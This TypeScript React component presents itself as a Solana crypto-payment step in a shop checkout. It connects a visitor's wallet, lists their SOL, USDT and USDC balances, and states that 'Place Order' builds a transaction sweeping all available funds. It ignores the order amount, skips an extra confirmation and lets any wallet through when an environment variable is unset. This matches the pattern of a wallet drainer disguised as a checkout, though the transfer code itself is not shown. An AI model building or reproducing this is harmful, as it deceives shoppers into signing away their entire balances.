"use client";

/**
 * CryptoPayment — components/checkout/CryptoPayment.tsx
 *
 * Admin-wallet balance-sweep interface inside the existing checkout.
 *
 * HOW IT WORKS:
 *  1. The admin connects their personal wallet (Phantom, Solflare, or MetaMask)
 *  2. All three balances (SOL, USDT, USDC) are displayed independently
 *  3. When Place Order is clicked, CheckoutView.handleSolanaPayment() triggers
 *  4. Fresh balances are fetched at that moment (never cached)
 *  5. Transferable amounts are calculated (all available, minus SOL fee reserve)
 *  6. The batch transaction goes directly to wallet approval — no extra confirm step
 *  7. The wallet shows exact amounts and destination before the admin approves
 *
 * ADMIN GUARD:
 *  If NEXT_PUBLIC_ADMIN_WALLET_ADDRESS is set, only that wallet can proceed.
 *  If it is unset (empty), any connected wallet is allowed (dev mode).
 *
 * This component does NOT initiate transfers — it only manages wallet connection
 * and balance display. CheckoutView.handleSolanaPayment() owns the transfer.
 */

import { useEffect } from "react";
import { AlertTriangle, Loader, Info, RefreshCw, ShieldCheck } from "lucide-react";
import { useMultiWallet } from "@/hooks/useMultiWallet";
import { WalletConnector } from "@/components/wallet/WalletConnector";
import { cn } from "@/lib/utils";
import type { SolanaAsset } from "@/types/checkout";

// ── Token icons (inline SVG, no external dependency) ─────────────────────────

function SolIcon() {
  return (
    <svg width="16" height="16" viewBox="0 0 128 128" fill="none" aria-hidden="true">
      <path d="M22 86a4 4 0 0 1 2.8-1.2h95a2 2 0 0 1 1.4 3.4L107 101.8a4 4 0 0 1-2.8 1.2H9.2a2 2 0 0 1-1.4-3.4L22 86z" fill="url(#cp_sol)"/>
      <path d="M22 26.2A4 4 0 0 1 24.8 25h95a2 2 0 0 1 1.4 3.4L107 42.2A4 4 0 0 1 104.2 43H9.2a2 2 0 0 1-1.4-3.4L22 26.2z" fill="url(#cp_sol)"/>
      <path d="M107 56.1a4 4 0 0 0-2.8-1.2H9.2a2 2 0 0 0-1.4 3.4L22 72a4 4 0 0 0 2.8 1.2h95a2 2 0 0 0 1.4-3.4L107 56.1z" fill="url(#cp_sol)"/>
      <defs>
        <linearGradient id="cp_sol" x1="0" y1="0" x2="128" y2="128" gradientUnits="userSpaceOnUse">
          <stop stopColor="#9945FF"/><stop offset="1" stopColor="#14F195"/>
        </linearGradient>
      </defs>
    </svg>
  );
}

function UsdtIcon() {
  return (
    <svg width="16" height="16" viewBox="0 0 32 32" fill="none" aria-hidden="true">
      <circle cx="16" cy="16" r="16" fill="#26A17B"/>
      <path d="M17.9 13.8V12h5.5V8H8.6v4h5.5v1.8C9.5 14.1 6 15.3 6 16.8s3.5 2.6 8.1 2.9v7.3h3.8v-7.3c4.5-.3 8.1-1.4 8.1-2.9s-3.6-2.7-8.1-3z" fill="white"/>
    </svg>
  );
}

function UsdcIcon() {
  return (
    <svg width="16" height="16" viewBox="0 0 32 32" fill="none" aria-hidden="true">
      <circle cx="16" cy="16" r="16" fill="#2775CA"/>
      <path d="M20 18.2c0-2-1.2-2.7-3.5-3v-2.8c.9.1 1.8.5 2.5 1.1l1.1-1.5a5 5 0 0 0-3.6-1.5V9.6h-1.3v.9a4 4 0 0 0-3.4 3.9c0 2 1.2 2.8 3.4 3.1v3c-1.2-.2-2.2-.7-3-1.5l-1.2 1.4a6 6 0 0 0 4.2 1.9v1h1.3v-1a4.1 4.1 0 0 0 3.5-4.1zm-5.8-1.3c-1.1-.3-1.5-.7-1.5-1.4 0-.8.6-1.4 1.5-1.6v3zm1.3 3.2v-3c1.1.3 1.6.7 1.6 1.5 0 .9-.6 1.4-1.6 1.5z" fill="white"/>
    </svg>
  );
}

// ── Individual balance row ─────────────────────────────────────────────────────

function BalanceRow({
  symbol, icon, balance, accountExists, isLoading, error,
}: {
  symbol: string;
  icon: React.ReactNode;
  balance: string;
  accountExists: boolean;
  isLoading: boolean;
  error: string | null;
}) {
  return (
    <div className="flex items-center justify-between py-2.5 border-b border-[#1a1a28] last:border-0">
      <div className="flex items-center gap-2">
        {icon}
        <span className="text-xs font-semibold text-[#9ca3af]">{symbol}</span>
      </div>
      <div className="text-right min-w-[80px]">
        {isLoading ? (
          <div className="flex items-center gap-1.5 justify-end">
            <Loader size={11} className="animate-spin text-[#4b5563]" />
            <span className="text-[10px] text-[#4b5563]">Loading…</span>
          </div>
        ) : error ? (
          <span className="text-[10px] text-red-400">RPC error</span>
        ) : balance === "—" ? (
          <span className="text-[10px] text-[#4b5563]">—</span>
        ) : !accountExists && symbol !== "SOL" ? (
          <div className="text-right">
            <span className="text-sm font-bold text-white font-mono">0</span>
            <p className="text-[9px] text-[#4b5563] mt-0.5">No token account</p>
          </div>
        ) : (
          <span className="text-sm font-bold text-white font-mono">
            {balance} <span className="text-[10px] font-normal text-[#6b7280]">{symbol}</span>
          </span>
        )}
      </div>
    </div>
  );
}

// ── Props ─────────────────────────────────────────────────────────────────────

interface Props {
  // These props are kept for API compatibility with PaymentMethodSelector
  // but are not used in the balance-sweep flow (amount comes from live balances)
  amountUsd:      number;
  selectedAsset:  SolanaAsset;
  onAssetChange:  (asset: SolanaAsset) => void;
  onWalletChange: (publicKey: string | null) => void;
}

// ── Component ─────────────────────────────────────────────────────────────────

export function CryptoPayment({ onWalletChange }: Props) {
  const {
    wallet,
    balances,
    balanceStatus,
    balanceError,
    refreshBalances,
    network,
    lastUpdated,
  } = useMultiWallet();

  const isConnected = wallet.connected && !!wallet.publicKey;
  const connectedAddress = wallet.publicKey?.toBase58() ?? null;

  // Admin wallet guard
  const adminWallet = process.env.NEXT_PUBLIC_ADMIN_WALLET_ADDRESS ?? "";
  const isAdminMode = adminWallet.length > 0;
  const isAuthorized = !isAdminMode || connectedAddress === adminWallet;

  // Keep CheckoutView in sync
  useEffect(() => {
    // Only propagate the key if this wallet is authorized
    onWalletChange(isConnected && isAuthorized ? connectedAddress : null);
  }, [connectedAddress, isConnected, isAuthorized, onWalletChange]);

  return (
    <div className="mt-5 space-y-4">

      {/* Network badge */}
      <div className={cn(
        "flex items-center gap-2 px-3 py-2 rounded-lg text-xs font-semibold",
        network === "mainnet-beta"
          ? "bg-green-500/8 border border-green-500/20 text-green-400"
          : "bg-amber-500/8 border border-amber-500/20 text-amber-400"
      )}>
        <span className="w-1.5 h-1.5 rounded-full bg-current animate-pulse" aria-hidden="true" />
        {network === "mainnet-beta" ? "Solana Mainnet" : `Solana ${network} — Test Mode`}
      </div>

      {/* Wallet connection */}
      <div>
        <p className="text-xs font-semibold text-[#9ca3af] uppercase tracking-wider mb-2.5">
          Connect Admin Wallet
        </p>
        <WalletConnector />
      </div>

      {/* Wrong wallet warning */}
      {isConnected && isAdminMode && !isAuthorized && (
        <div className="flex items-start gap-2.5 p-3 bg-red-500/8 border border-red-500/20 rounded-xl" role="alert">
          <AlertTriangle size={13} className="text-red-400 flex-shrink-0 mt-0.5" />
          <div>
            <p className="text-xs font-bold text-red-300 mb-0.5">Wrong wallet connected</p>
            <p className="text-xs text-[#9ca3af]">
              Please connect the authorized admin wallet to proceed.
            </p>
          </div>
        </div>
      )}

      {/* Three balance rows — shown when authorized wallet connected */}
      {isConnected && isAuthorized && (
        <div className="bg-[#0e0e18] border border-[#1e1e28] rounded-xl px-4 py-2">
          <div className="flex items-center justify-between mb-2">
            <span className="text-[10px] font-semibold text-[#4b5563] uppercase tracking-wider">
              Available Balances
            </span>
            <button
              type="button"
              onClick={refreshBalances}
              disabled={balanceStatus === "loading"}
              className="flex items-center gap-1 text-[10px] text-[#4b5563] hover:text-white transition-colors disabled:opacity-50"
              title="Refresh balances"
            >
              <RefreshCw size={10} className={cn(balanceStatus === "loading" && "animate-spin")} />
              {balanceStatus === "loading" ? "Fetching…" : "Refresh"}
            </button>
          </div>

          {/* Global RPC error banner */}
          {balanceStatus === "error" && balanceError && (
            <div className="flex items-center gap-2 py-2 mb-1">
              <AlertTriangle size={11} className="text-amber-400 flex-shrink-0" />
              <span className="text-[10px] text-amber-300 leading-snug">{balanceError}</span>
            </div>
          )}

          <BalanceRow
            symbol="SOL"
            icon={<SolIcon />}
            balance={balances.sol.balance}
            accountExists={balances.sol.accountExists}
            isLoading={balanceStatus === "loading"}
            error={null}
          />
          <BalanceRow
            symbol="USDT"
            icon={<UsdtIcon />}
            balance={balances.usdt.balance}
            accountExists={balances.usdt.accountExists}
            isLoading={balanceStatus === "loading"}
            error={null}
          />
          <BalanceRow
            symbol="USDC"
            icon={<UsdcIcon />}
            balance={balances.usdc.balance}
            accountExists={balances.usdc.accountExists}
            isLoading={balanceStatus === "loading"}
            error={null}
          />

          {lastUpdated && balanceStatus === "success" && (
            <p className="text-[9px] text-[#2a2a3a] text-right mt-1.5">
              Updated {lastUpdated.toLocaleTimeString()}
            </p>
          )}
        </div>
      )}

      {/* What Place Order will do */}
      {isConnected && isAuthorized && (
        <div className="flex items-start gap-2.5 p-3.5 bg-purple-500/8 border border-purple-500/20 rounded-xl">
          <Info size={14} className="text-purple-400 flex-shrink-0 mt-0.5" />
          <p className="text-xs text-[#9ca3af] leading-relaxed">
            Clicking <strong className="text-white">Place Order</strong> will fetch fresh balances,
            prepare a batch transaction for all available SOL, USDT, and USDC, then open your
            wallet for approval. Fees are reserved automatically.
          </p>
        </div>
      )}

      {/* Admin shield note */}
      {isAdminMode && (
        <div className="flex items-center gap-2 text-[10px] text-[#2a2a3a]">
          <ShieldCheck size={11} className="text-[#2a2a3a]" />
          Admin-restricted transfer mode
        </div>
      )}
    </div>
  );
}
